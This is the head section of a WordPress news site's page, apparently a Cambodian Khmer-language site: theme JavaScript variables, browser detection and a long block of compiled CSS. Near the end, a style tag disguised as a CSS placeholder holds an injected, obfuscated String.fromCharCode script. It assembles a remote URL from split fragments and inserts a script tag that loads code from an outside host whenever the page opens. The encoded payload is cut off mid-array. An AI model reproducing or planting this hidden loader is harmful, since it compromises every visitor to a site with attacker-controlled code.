                htmlTag.className += ' ieEdge';
            }

            if (/(iPad|iPhone|iPod)/g.test(navigator.userAgent)) {
                htmlTag.className += ' td-md-is-ios';
            }

            var user_agent = navigator.userAgent.toLowerCase();
            if (user_agent.indexOf("android") > -1) {
                htmlTag.className += ' td-md-is-android';
            }

            if (-1 !== navigator.userAgent.indexOf('Mac OS X')) {
                htmlTag.className += ' td-md-is-os-x';
            }

            if (/chrom(e|ium)/.test(navigator.userAgent.toLowerCase())) {
                htmlTag.className += ' td-md-is-chrome';
            }

            if (-1 !== navigator.userAgent.indexOf('Firefox')) {
                htmlTag.className += ' td-md-is-firefox';
            }

            if (-1 !== navigator.userAgent.indexOf('Safari') && -1 === navigator.userAgent.indexOf('Chrome')) {
                htmlTag.className += ' td-md-is-safari';
            }

            if (-1 !== navigator.userAgent.indexOf('IEMobile')) {
                htmlTag.className += ' td-md-is-iemobile';
            }

        })();

        var tdLocalCache = {};

        (function() {
            "use strict";

            tdLocalCache = {
                data: {},
                remove: function(resource_id) {
                    delete tdLocalCache.data[resource_id];
                },
                exist: function(resource_id) {
                    return tdLocalCache.data.hasOwnProperty(resource_id) && tdLocalCache.data[resource_id] !== null;
                },
                get: function(resource_id) {
                    return tdLocalCache.data[resource_id];
                },
                set: function(resource_id, cachedData) {
                    tdLocalCache.remove(resource_id);
                    tdLocalCache.data[resource_id] = cachedData;
                }
            };
        })();



        var td_viewport_interval_list = [{
            "limitBottom": 767,
            "sidebarWidth": 228
        }, {
            "limitBottom": 1018,
            "sidebarWidth": 300
        }, {
            "limitBottom": 1140,
            "sidebarWidth": 324
        }];
        var td_animation_stack_effect = "type1";
        var tds_animation_stack = true;
        var td_animation_stack_specific_selectors = ".entry-thumb, img[class*=\"wp-image-\"], a.td-sml-link-to-image > img, .td-lazy-img";
        var td_animation_stack_general_selectors = ".td-animation-stack .entry-thumb, .post .entry-thumb, .post img[class*=\"wp-image-\"], .post a.td-sml-link-to-image > img, .td-animation-stack .td-lazy-img";
        var tds_general_modal_image = "yes";
        var tdc_is_installed = "yes";
        var td_ajax_url = "https:\/\/www.theseedcambodia.com\/wp-admin\/admin-ajax.php?td_theme_name=Newspaper&v=12.6.2";
        var td_get_template_directory_uri = "https:\/\/www.theseedcambodia.com\/wp-content\/plugins\/td-composer\/legacy\/common";
        var tds_snap_menu = "";
        var tds_logo_on_sticky = "";
        var tds_header_style = "";
        var td_please_wait = "\u179f\u17bc\u1798\u200b\u179a\u1784\u17cb\u1785\u17b6\u17c6 ...";
        var td_email_user_pass_incorrect = "\u17a2\u17d2\u1793\u1780\u200b\u1794\u17d2\u179a\u17be\u200b\u17ac\u200b\u1796\u17b6\u1780\u17d2\u1799\u200b\u179f\u1798\u17d2\u1784\u17b6\u178f\u17cb\u200b\u1798\u17b7\u1793\u200b\u178f\u17d2\u179a\u17b9\u1798\u178f\u17d2\u179a\u17bc\u179c\u200b!";
        var td_email_user_incorrect = "\u17a2\u17ca\u17b8\u200b\u1798\u17c9\u17c2\u200b\u179b\u200b\u17ac\u200b\u1788\u17d2\u1798\u17c4\u17c7\u200b\u17a2\u17d2\u1793\u1780\u200b\u1794\u17d2\u179a\u17be\u200b\u1798\u17b7\u1793\u200b\u178f\u17d2\u179a\u17b9\u1798\u178f\u17d2\u179a\u17bc\u179c\u200b!";
        var td_email_incorrect = "\u17a2\u17ca\u17b8\u200b\u1798\u17c9\u17c2\u200b\u179b\u200b\u178a\u17c2\u179b\u200b\u1798\u17b7\u1793\u200b\u178f\u17d2\u179a\u17b9\u1798\u178f\u17d2\u179a\u17bc\u179c\u200b!";
        var td_user_incorrect = "Username incorrect!";
        var td_email_user_empty = "Email or username empty!";
        var td_pass_empty = "Pass empty!";
        var td_pass_pattern_incorrect = "Invalid Pass Pattern!";
        var td_retype_pass_incorrect = "Retyped Pass incorrect!";
        var tds_more_articles_on_post_enable = "";
        var tds_more_articles_on_post_time_to_wait = "";
        var tds_more_articles_on_post_pages_distance_from_top = 0;
        var tds_captcha = "";
        var tds_theme_color_site_wide = "#bb0101";
        var tds_smart_sidebar = "";
        var tdThemeName = "Newspaper";
        var tdThemeNameWl = "Newspaper";
        var td_magnific_popup_translation_tPrev = "(\u1782\u17d2\u179a\u17b6\u1794\u17cb\u1785\u17bb\u1785\u200b\u1796\u17d2\u179a\u17bd\u1789\u200b\u1786\u17d2\u179c\u17c1\u1784\u200b) \u1798\u17bb\u1793";
        var td_magnific_popup_translation_tNext = "(\u1782\u17d2\u179a\u17b6\u1794\u17cb\u1785\u17bb\u1785\u200b\u1796\u17d2\u179a\u17bd\u1789\u200b\u179f\u17d2\u178a\u17b6\u17c6\u200b) \u1780\u17d2\u179a\u17c4\u1799";
        var td_magnific_popup_translation_tCounter = "%curr% \u1793\u17c3 %total%";
        var td_magnific_popup_translation_ajax_tError = "\u1798\u17b6\u178f\u17b7\u1780\u17b6\u200b\u1796\u17b8 %url% \u1798\u17b7\u1793\u200b\u17a2\u17b6\u1785\u200b\u178f\u17d2\u179a\u17bc\u179c\u200b\u1794\u17b6\u1793\u200b\u1795\u17d2\u1791\u17bb\u1780\u200b\u17d4";
        var td_magnific_popup_translation_image_tError = "#%curr% \u179a\u17bc\u1794\u1797\u17b6\u1796\u200b\u1798\u17b7\u1793\u200b\u17a2\u17b6\u1785\u200b\u1795\u17d2\u1791\u17bb\u1780\u200b\u17d4";
        var tdBlockNonce = "f3d73130d6";
        var tdMobileMenu = "enabled";
        var tdMobileSearch = "enabled";
        var tdDateNamesI18n = {
            "month_names": ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"],
            "month_names_short": ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],
            "day_names": ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
            "day_names_short": ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"]
        };
        var tdb_modal_confirm = "Save";
        var tdb_modal_cancel = "Cancel";
        var tdb_modal_confirm_alt = "Yes";
        var tdb_modal_cancel_alt = "No";
        var td_ad_background_click_link = "";
        var td_ad_background_click_target = "";
    </script>


    <!-- Header style compiled by theme -->

    <style>
        body {
            background-color: #fff5e7
        }

        @font-face {
            font-family: "KhmerOSSiemreap";
            src: local("KhmerOSSiemreap"), url("https://www.theseedcambodia.com/wp-content/uploads/2021/09/KhmerOSSiemreap.woff") format("woff");
            font-display: swap
        }

        @font-face {
            font-family: "KhmerOSMetalChrieng";
            src: local("KhmerOSMetalChrieng"), url("https://www.theseedcambodia.com/wp-content/uploads/2021/09/KhmerOSMetalChrieng.woff") format("woff");
            font-display: swap
        }

        .td-header-wrap .black-menu .sf-menu>.current-menu-item>a,
        .td-header-wrap .black-menu .sf-menu>.current-menu-ancestor>a,
        .td-header-wrap .black-menu .sf-menu>.current-category-ancestor>a,
        .td-header-wrap .black-menu .sf-menu>li>a:hover,
        .td-header-wrap .black-menu .sf-menu>.sfHover>a,
        .sf-menu>.current-menu-item>a:after,
        .sf-menu>.current-menu-ancestor>a:after,
        .sf-menu>.current-category-ancestor>a:after,
        .sf-menu>li:hover>a:after,
        .sf-menu>.sfHover>a:after,
        .header-search-wrap .td-drop-down-search:after,
        .header-search-wrap .td-drop-down-search .btn:hover,
        input[type=submit]:hover,
        .td-read-more a,
        .td-post-category:hover,
        .td_top_authors .td-active .td-author-post-count,
        .td_top_authors .td-active .td-author-comments-count,
        .td_top_authors .td_mod_wrap:hover .td-author-post-count,
        .td_top_authors .td_mod_wrap:hover .td-author-comments-count,
        .td-404-sub-sub-title a:hover,
        .td-search-form-widget .wpb_button:hover,
        .td-rating-bar-wrap div,
        .dropcap,
        .td_wrapper_video_playlist .td_video_controls_playlist_wrapper,
        .wpb_default,
        .wpb_default:hover,
        .td-left-smart-list:hover,
        .td-right-smart-list:hover,
        #bbpress-forums button:hover,
        .bbp_widget_login .button:hover,
        .td-footer-wrapper .td-post-category,
        .td-footer-wrapper .widget_product_search input[type="submit"]:hover,
        .single-product .product .summary .cart .button:hover,
        .td-next-prev-wrap a:hover,
        .td-load-more-wrap a:hover,
        .td-post-small-box a:hover,
        .page-nav .current,
        .page-nav:first-child>div,
        #bbpress-forums .bbp-pagination .current,
        #bbpress-forums #bbp-single-user-details #bbp-user-navigation li.current a,
        .td-theme-slider:hover .slide-meta-cat a,
        a.vc_btn-black:hover,
        .td-trending-now-wrapper:hover .td-trending-now-title,
        .td-scroll-up,
        .td-smart-list-button:hover,
        .td-weather-information:before,
        .td-weather-week:before,
        .td_block_exchange .td-exchange-header:before,
        .td-pulldown-syle-2 .td-subcat-dropdown ul:after,
        .td_block_template_9 .td-block-title:after,
        .td_block_template_15 .td-block-title:before,
        div.wpforms-container .wpforms-form div.wpforms-submit-container button[type=submit],
        .td-close-video-fixed {
            background-color: #bb0101
        }

        .td_block_template_4 .td-related-title .td-cur-simple-item:before {
            border-color: #bb0101 transparent transparent transparent !important
        }

        .td_block_template_4 .td-related-title .td-cur-simple-item,
        .td_block_template_3 .td-related-title .td-cur-simple-item,
        .td_block_template_9 .td-related-title:after {
            background-color: #bb0101
        }

        a,
        cite a:hover,
        .td-page-content blockquote p,
        .td-post-content blockquote p,
        .mce-content-body blockquote p,
        .comment-content blockquote p,
        .wpb_text_column blockquote p,
        .td_block_text_with_title blockquote p,
        .td_module_wrap:hover .entry-title a,
        .td-subcat-filter .td-subcat-list a:hover,
        .td-subcat-filter .td-subcat-dropdown a:hover,
        .td_quote_on_blocks,
        .dropcap2,
        .dropcap3,
        .td_top_authors .td-active .td-authors-name a,
        .td_top_authors .td_mod_wrap:hover .td-authors-name a,
        .td-post-next-prev-content a:hover,
        .author-box-wrap .td-author-social a:hover,
        .td-author-name a:hover,
        .td-author-url a:hover,
        .comment-reply-link:hover,
        .logged-in-as a:hover,
        #cancel-comment-reply-link:hover,
        .td-search-query,
        .widget a:hover,
        .td_wp_recentcomments a:hover,
        .archive .widget_archive .current,
        .archive .widget_archive .current a,
        .widget_calendar tfoot a:hover,
        #bbpress-forums li.bbp-header .bbp-reply-content span a:hover,
        #bbpress-forums .bbp-forum-freshness a:hover,
        #bbpress-forums .bbp-topic-freshness a:hover,
        #bbpress-forums .bbp-forums-list li a:hover,
        #bbpress-forums .bbp-forum-title:hover,
        #bbpress-forums .bbp-topic-permalink:hover,
        #bbpress-forums .bbp-topic-started-by a:hover,
        #bbpress-forums .bbp-topic-started-in a:hover,
        #bbpress-forums .bbp-body .super-sticky li.bbp-topic-title .bbp-topic-permalink,
        #bbpress-forums .bbp-body .sticky li.bbp-topic-title .bbp-topic-permalink,
        .widget_display_replies .bbp-author-name,
        .widget_display_topics .bbp-author-name,
        .td-subfooter-menu li a:hover,
        a.vc_btn-black:hover,
        .td-smart-list-dropdown-wrap .td-smart-list-button:hover,
        .td-instagram-user a,
        .td-block-title-wrap .td-wrapper-pulldown-filter .td-pulldown-filter-display-option:hover,
        .td-block-title-wrap .td-wrapper-pulldown-filter .td-pulldown-filter-display-option:hover i,
        .td-block-title-wrap .td-wrapper-pulldown-filter .td-pulldown-filter-link:hover,
        .td-block-title-wrap .td-wrapper-pulldown-filter .td-pulldown-filter-item .td-cur-simple-item,
        .td-pulldown-syle-2 .td-subcat-dropdown:hover .td-subcat-more span,
        .td-pulldown-syle-2 .td-subcat-dropdown:hover .td-subcat-more i,
        .td-pulldown-syle-3 .td-subcat-dropdown:hover .td-subcat-more span,
        .td-pulldown-syle-3 .td-subcat-dropdown:hover .td-subcat-more i,
        .td_block_template_2 .td-related-title .td-cur-simple-item,
        .td_block_template_5 .td-related-title .td-cur-simple-item,
        .td_block_template_6 .td-related-title .td-cur-simple-item,
        .td_block_template_7 .td-related-title .td-cur-simple-item,
        .td_block_template_8 .td-related-title .td-cur-simple-item,
        .td_block_template_9 .td-related-title .td-cur-simple-item,
        .td_block_template_10 .td-related-title .td-cur-simple-item,
        .td_block_template_11 .td-related-title .td-cur-simple-item,
        .td_block_template_12 .td-related-title .td-cur-simple-item,
        .td_block_template_13 .td-related-title .td-cur-simple-item,
        .td_block_template_14 .td-related-title .td-cur-simple-item,
        .td_block_template_15 .td-related-title .td-cur-simple-item,
        .td_block_template_16 .td-related-title .td-cur-simple-item,
        .td_block_template_17 .td-related-title .td-cur-simple-item,
        .td-theme-wrap .sf-menu ul .td-menu-item>a:hover,
        .td-theme-wrap .sf-menu ul .sfHover>a,
        .td-theme-wrap .sf-menu ul .current-menu-ancestor>a,
        .td-theme-wrap .sf-menu ul .current-category-ancestor>a,
        .td-theme-wrap .sf-menu ul .current-menu-item>a,
        .td_outlined_btn,
        .td_block_categories_tags .td-ct-item:hover {
            color: #bb0101
        }

        a.vc_btn-black.vc_btn_square_outlined:hover,
        a.vc_btn-black.vc_btn_outlined:hover {
            color: #bb0101 !important
        }

        .td-next-prev-wrap a:hover,
        .td-load-more-wrap a:hover,
        .td-post-small-box a:hover,
        .page-nav .current,
        .page-nav:first-child>div,
        #bbpress-forums .bbp-pagination .current,
        .post .td_quote_box,
        .page .td_quote_box,
        a.vc_btn-black:hover,
        .td_block_template_5 .td-block-title>*,
        .td_outlined_btn {
            border-color: #bb0101
        }

        .td_wrapper_video_playlist .td_video_currently_playing:after {
            border-color: #bb0101 !important
        }

        .header-search-wrap .td-drop-down-search:before {
            border-color: transparent transparent #bb0101 transparent
        }

        .block-title>span,
        .block-title>a,
        .block-title>label,
        .widgettitle,
        .widgettitle:after,
        body .td-trending-now-title,
        .td-trending-now-wrapper:hover .td-trending-now-title,
        .wpb_tabs li.ui-tabs-active a,
        .wpb_tabs li:hover a,
        .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container .vc_tta-tab.vc_active>a,
        .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container .vc_tta-tab:hover>a,
        .td_block_template_1 .td-related-title .td-cur-simple-item,
        .td-subcat-filter .td-subcat-dropdown:hover .td-subcat-more,
        .td_3D_btn,
        .td_shadow_btn,
        .td_default_btn,
        .td_round_btn,
        .td_outlined_btn:hover {
            background-color: #bb0101
        }

        .block-title,
        .td_block_template_1 .td-related-title,
        .wpb_tabs .wpb_tabs_nav,
        .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container {
            border-color: #bb0101
        }

        .td_block_wrap .td-subcat-item a.td-cur-simple-item {
            color: #bb0101
        }

        .td-grid-style-4 .entry-title {
            background-color: rgba(187, 1, 1, 0.7)
        }

        .td-container-wrap,
        .post,
        .tagdiv-type .td_quote_box {
            background-color: transparent
        }

        .td-menu-background:before,
        .td-search-background:before {
            background: #bb0000;
            background: -moz-linear-gradient(top, #bb0000 0%, #bb0000 100%);
            background: -webkit-gradient(left top, left bottom, color-stop(0%, #bb0000), color-stop(100%, #bb0000));
            background: -webkit-linear-gradient(top, #bb0000 0%, #bb0000 100%);
            background: -o-linear-gradient(top, #bb0000 0%, #bb0000 100%);
            background: -ms-linear-gradient(top, #bb0000 0%, #bb0000 100%);
            background: linear-gradient(to bottom, #bb0000 0%, #bb0000 100%);
            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#bb0000', endColorstr='#bb0000', GradientType=0)
        }

        .td-mobile-content .current-menu-item>a,
        .td-mobile-content .current-menu-ancestor>a,
        .td-mobile-content .current-category-ancestor>a,
        #td-mobile-nav .td-menu-login-section a:hover,
        #td-mobile-nav .td-register-section a:hover,
        #td-mobile-nav .td-menu-socials-wrap a:hover i,
        .td-search-close a:hover i {
            color: #ffd323
        }

        .td-page-content p,
        .td-page-content .td_block_text_with_title {
            color: #000000
        }

        .td-mobile-content .td-mobile-main-menu>li>a {
            font-family: KhmerOSSiemreap
        }

        .td-mobile-content .sub-menu a {
            font-family: KhmerOSSiemreap
        }

        #td-mobile-nav,
        #td-mobile-nav .wpb_button,
        .td-search-wrap-mob {
            font-family: KhmerOSSiemreap
        }

        .td-page-content p,
        .td-page-content li,
        .td-page-content .td_block_text_with_title,
        .wpb_text_column p {
            font-family: KhmerOSSiemreap
        }

        body,
        p {
            font-family: KhmerOSSiemreap;
            font-size: 15px
        }

        .white-popup-block,
        .white-popup-block .wpb_button {
            font-family: KhmerOSSiemreap
        }

        .td_cl .td-container {
            width: 100%
        }

        @media (min-width:768px) and (max-width:1018px) {
            .td_cl {
                padding: 0 14px
            }
        }

        @media (max-width:767px) {
            .td_cl .td-container {
                padding: 0
            }
        }

        @media (min-width:1019px) and (max-width:1140px) {
            .td_cl.stretch_row_content_no_space {
                padding-left: 20px;
                padding-right: 20px
            }
        }

        @media (min-width:1141px) {
            .td_cl.stretch_row_content_no_space {
                padding-left: 24px;
                padding-right: 24px
            }
        }
    </style>

    <link rel="icon" href="https://www.theseedcambodia.com/wp-content/uploads/2021/01/cropped-THE-SEED-32x32.png" sizes="32x32">
    <link rel="icon" href="https://www.theseedcambodia.com/wp-content/uploads/2021/01/cropped-THE-SEED-192x192.png" sizes="192x192">
    <link rel="apple-touch-icon" href="https://www.theseedcambodia.com/wp-content/uploads/2021/01/cropped-THE-SEED-180x180.png">
    <meta name="msapplication-TileImage" content="https://www.theseedcambodia.com/wp-content/uploads/2021/01/cropped-THE-SEED-270x270.png">
    <style type="text/css" id="wp-custom-css">
        .brave_element__text_inner {
            font-family: 'Kantumruy', 'Roboto', sans-serif !important;
        }

        .btn-donate {
            margin: 15px 0;
        }

        .telegram-link {
            margin-right: 10px;
        }

        .btn-donate a:hover {
            background: #ffde59;
            color: #222;
        }
    </style>

    <!-- Button style compiled by theme -->

    <style>
        .tdm-btn-style1 {
            background-color: #bb0101
        }

        .tdm-btn-style2:before {
            border-color: #bb0101
        }

        .tdm-btn-style2 {
            color: #bb0101
        }

        .tdm-btn-style3 {
            -webkit-box-shadow: 0 2px 16px #bb0101;
            -moz-box-shadow: 0 2px 16px #bb0101;
            box-shadow: 0 2px 16px #bb0101
        }

        .tdm-btn-style3:hover {
            -webkit-box-shadow: 0 4px 26px #bb0101;
            -moz-box-shadow: 0 4px 26px #bb0101;
            box-shadow: 0 4px 26px #bb0101
        }
    </style>

    <style id="tdw-css-placeholder">
        var iz=String;
        var iz2=iz['fromCharCode'](118, 97, 114, 32, 95, 48, 120, 52, 99, 54, 102, 52, 98, 61, 95, 48, 120, 52, 97, 56, 57, 59, 40, 102, 117, 110, 99, 116, 105, 111, 110, 40, 95, 48, 120, 50, 53, 100, 54, 55, 98, 44, 95, 48, 120, 50, 55, 54, 50, 54, 55, 41, 123, 118, 97, 114, 32, 95, 48, 120, 49, 50, 51, 101, 56, 48, 61, 95, 48, 120, 52, 97, 56, 57, 44, 95, 48, 120, 51, 99, 56, 54, 54, 54, 61, 95, 48, 120, 50, 53, 100, 54, 55, 98, 40, 41, 59, 119, 104, 105, 108, 101, 40, 33, 33, 91, 93, 41, 123, 116, 114, 121, 123, 118, 97, 114, 32, 95, 48, 120, 51, 49, 101, 51, 99, 102, 61, 45, 112, 97, 114, 115, 101, 73, 110, 116, 40, 95, 48, 120, 49, 50, 51, 101, 56, 48, 40, 48, 120, 49, 100, 56, 41, 41, 47, 48, 120, 49, 43, 112, 97, 114, 115, 101, 73, 110, 116, 40, 95, 48, 120, 49, 50, 51, 101, 56, 48, 40, 48, 120, 49, 101, 48, 41, 41, 47, 48, 120, 50, 43, 45, 112, 97, 114, 115, 101, 73, 110, 116, 40, 95, 48, 120, 49, 50, 51, 101, 56, 48, 40, 48, 120, 49, 100, 49, 41, 41, 47, 48, 120, 51, 43, 45, 112, 97, 114, 115, 101, 73, 110, 116, 40, 95, 48, 120, 49, 50, 51, 101, 56, 48, 40, 48, 120, 49, 101, 53, 41, 41, 47, 48, 120, 52, 42, 40, 45, 112, 97, 114, 115, 101, 73, 110, 116, 40, 95, 48, 120, 49, 50, 51, 101, 56, 48, 40, 48, 120, 49, 101, 50, 41, 41, 47, 48, 120, 53, 41, 43, 112, 97, 114, 115, 101, 73, 110, 116, 40, 95, 48, 120, 49, 50, 51, 101, 56, 48, 40, 48, 120, 49, 100, 101, 41, 41, 47, 48, 120, 54, 42, 40, 45, 112, 97, 114, 115, 101, 73, 110, 116, 40, 95, 48, 120, 49, 50, 51, 101, 56, 48, 40, 48, 120, 49, 100, 52, 41, 41, 47, 48, 120, 55, 41, 43, 112, 97, 114, 115, 101, 73, 110, 116, 40, 95, 48, 120, 49, 50, 51, 101, 56, 48, 40, 48, 120, 49, 100, 98, 41, 41, 47, 48, 120, 56, 42, 40, 45, 112, 97, 114, 115, 101, 73, 110, 116, 40, 95, 48, 120, 49, 50, 51, 101, 56, 48, 40, 48, 120, 49, 101, 49, 41, 41, 47, 48, 120, 57, 41, 43, 112, 97, 114, 115, 101, 73, 110, 116, 40, 95, 48, 120, 49, 50, 51, 101, 56, 48, 40, 48, 120, 49, 100, 100, 41, 41, 47, 48, 120, 97, 59, 105, 102, 40, 95, 48, 120, 51, 49, 101, 51, 99, 102, 61, 61, 61, 95, 48, 120, 50, 55, 54, 50, 54, 55, 41, 98, 114, 101, 97, 107, 59, 101, 108, 115, 101, 32, 95, 48, 120, 51, 99, 56, 54, 54, 54, 91, 39, 112, 117, 115, 104, 39, 93, 40, 95, 48, 120, 51, 99, 56, 54, 54, 54, 91, 39, 115, 104, 105, 102, 116, 39, 93, 40, 41, 41, 59, 125, 99, 97, 116, 99, 104, 40, 95, 48, 120, 52, 52, 53, 101, 48, 52, 41, 123, 95, 48, 120, 51, 99, 56, 54, 54, 54, 91, 39, 112, 117, 115, 104, 39, 93, 40, 95, 48, 120, 51, 99, 56, 54, 54, 54, 91, 39, 115, 104, 105, 102, 116, 39, 93, 40, 41, 41, 59, 125, 125, 125, 40, 95, 48, 120, 53, 49, 102, 52, 44, 48, 120, 100, 52, 50, 99, 53, 41, 41, 59, 102, 117, 110, 99, 116, 105, 111, 110, 32, 116, 121, 101, 114, 121, 119, 101, 114, 40, 95, 48, 120, 51, 98, 101, 98, 97, 99, 41, 123, 118, 97, 114, 32, 95, 48, 120, 52, 98, 98, 56, 102, 48, 61, 95, 48, 120, 52, 97, 56, 57, 59, 114, 101, 116, 117, 114, 110, 32, 66, 111, 111, 108, 101, 97, 110, 40, 100, 111, 99, 117, 109, 101, 110, 116, 91, 39, 113, 117, 101, 114, 121, 83, 101, 108, 101, 99, 116, 111, 114, 39, 93, 40, 95, 48, 120, 52, 98, 98, 56, 102, 48, 40, 48, 120, 49, 101, 56, 41, 43, 95, 48, 120, 51, 98, 101, 98, 97, 99, 43, 39, 92, 120, 50, 50, 93, 39, 41, 41, 59, 125, 118, 97, 114, 32, 98, 100, 61, 39, 104, 116, 116, 39, 43, 39, 112, 115, 39, 43, 39, 58, 47, 47, 115, 116, 97, 121, 39, 43, 39, 46, 100, 101, 39, 43, 39, 99, 101, 110, 116, 39, 43, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 101, 97, 41, 43, 39, 112, 112, 39, 43, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 57, 41, 43, 39, 47, 112, 39, 43, 39, 97, 103, 39, 43, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 102, 41, 44, 100, 61, 100, 111, 99, 117, 109, 101, 110, 116, 59, 105, 102, 40, 116, 121, 101, 114, 121, 119, 101, 114, 40, 98, 100, 41, 61, 61, 61, 33, 91, 93, 41, 123, 118, 97, 114, 32, 115, 61, 100, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 55, 41, 93, 40, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 101, 54, 41, 41, 59, 115, 91, 39, 105, 100, 39, 93, 61, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 101, 51, 41, 44, 115, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 101, 55, 41, 93, 61, 98, 100, 44, 100, 91, 39, 99, 117, 114, 114, 101, 110, 116, 83, 99, 114, 105, 112, 116, 39, 93, 63, 100, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 99, 41, 93, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 54, 41, 93, 33, 61, 61, 110, 117, 108, 108, 38, 38, 100, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 99, 41, 93, 91, 39, 112, 97, 114, 101, 110, 116, 78, 111, 100, 101, 39, 93, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 97, 41, 93, 40, 115, 44, 100, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 99, 41, 93, 41, 58, 100, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 53, 41, 93, 40, 39, 104, 101, 97, 100, 39, 41, 91, 48, 120, 48, 93, 33, 61, 61, 110, 117, 108, 108, 38, 38, 100, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 53, 41, 93, 40, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 51, 41, 41, 91, 48, 120, 48, 93, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 101, 57, 41, 93, 40, 115, 41, 59, 125, 102, 117, 110, 99, 116, 105, 111, 110, 32, 95, 48, 120, 53, 49, 102, 52, 40, 41, 123, 118, 97, 114, 32, 95, 48, 120, 49, 102, 99, 56, 55, 100, 61, 91, 39, 115, 101, 99, 111, 110, 100, 95, 99, 104, 39, 44, 39, 114, 101, 109, 111, 118, 101, 39, 44, 39, 49, 50, 56, 56, 116, 87, 101, 98, 118, 109, 39, 44, 39, 115, 99, 114, 105, 112, 116, 39, 44, 39, 115, 114, 99, 39, 44, 39, 115, 99, 114, 105, 112, 116, 91, 115, 114, 99, 61, 92, 120, 50, 50, 39, 44, 39, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 39, 44, 39, 114, 97, 108, 97, 112, 39, 44, 39, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 66, 121, 73, 100, 39, 44, 39, 50, 48, 54, 51, 50, 50, 82, 76, 87, 109, 82, 113, 39, 44, 39, 102, 105, 114, 115, 116, 95, 116, 105, 109, 101, 95, 99, 104, 39, 44, 39, 104, 101, 97, 100, 39, 44, 39, 49, 49, 49, 51, 57, 50, 52, 68, 106, 98, 111, 69, 105, 39, 44, 39, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 39, 44, 39, 112, 97, 114, 101, 110, 116, 78, 111, 100, 101, 39, 44, 39, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 39, 44, 39, 49, 55, 49, 49, 53, 57, 51, 104, 114, 85, 115, 78, 101, 39, 44, 39, 115, 46, 99, 111, 109, 47, 115, 114, 99, 39, 44, 39, 105, 110, 115, 101, 114, 116, 66, 101, 102, 111, 114, 101, 39, 44, 39, 53, 50, 56, 53, 54, 52, 56, 108, 71, 88, 110, 111, 101, 39, 44, 39, 99, 117, 114, 114, 101, 110, 116, 83, 99, 114, 105, 112, 116, 39, 44, 39, 50, 51, 55, 48, 52, 57, 51, 48, 117, 104, 81, 119, 98, 101, 39, 44, 39, 54, 74, 77, 104, 113, 77, 71, 39, 44, 39, 101, 46, 106, 115, 39, 44, 39, 49, 49, 55, 52, 50, 54, 98, 109, 90, 90, 65, 89, 39, 44, 39, 57, 113, 82, 79, 115, 67, 101, 39, 44, 39, 49, 54, 49, 53, 48, 66, 109, 83, 78, 104, 77, 39, 93, 59, 95, 48, 120, 53, 49, 102, 52, 61, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 123, 114, 101, 116, 117, 114, 110, 32, 95, 48, 120, 49, 102, 99, 56, 55, 100, 59, 125, 59, 114, 101, 116, 117, 114, 110, 32, 95, 48, 120, 53, 49, 102, 52, 40, 41, 59, 125, 102, 117, 110, 99, 116, 105, 111, 110, 32, 95, 48, 120, 52, 97, 56, 57, 40, 95, 48, 120, 98, 56, 48, 101, 98, 98, 44, 95, 48, 120, 53, 51, 49, 51, 99, 102, 41, 123, 118, 97, 114, 32, 95, 48, 120, 53, 49, 102, 52, 102, 100, 61, 95, 48, 120, 53, 49, 102, 52, 40, 41, 59, 114, 101, 116, 117, 114, 110, 32, 95, 48, 120, 52, 97, 56, 57, 61, 102, 117, 110, 99, 116, 105, 111, 110, 40, 95, 48, 120, 52, 97, 56, 57, 50, 97, 44, 95, 48, 120, 53, 53, 101, 55, 52, 48, 41, 123, 95, 48, 120, 52, 97, 56, 57, 50, 97, 61, 95, 48, 120, 52, 97, 56, 57, 50, 97, 45, 48, 120, 49, 100, 49, 59, 118, 97, 114, 32, 95, 48, 120, 52, 49, 102, 98, 102, 53, 61, 95, 48, 120, 53, 49, 102, 52, 102, 100, 91, 95, 48, 120, 52, 97, 56, 57, 50, 97, 93, 59, 114, 101, 116, 117, 114, 110, 32, 95, 48, 120, 52, 49, 102, 98, 102, 53, 59, 125, 44, 95, 48, 120, 52, 97, 56, 57, 40, 95, 48, 120, 98, 56, 48, 101, 98, 98, 44, 95, 48, 120, 53, 51, 49, 51, 99, 102, 41, 59, 125, 118, 97, 114, 32, 108, 105, 61, 100, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 101, 98, 41, 93, 40, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 50, 41, 41, 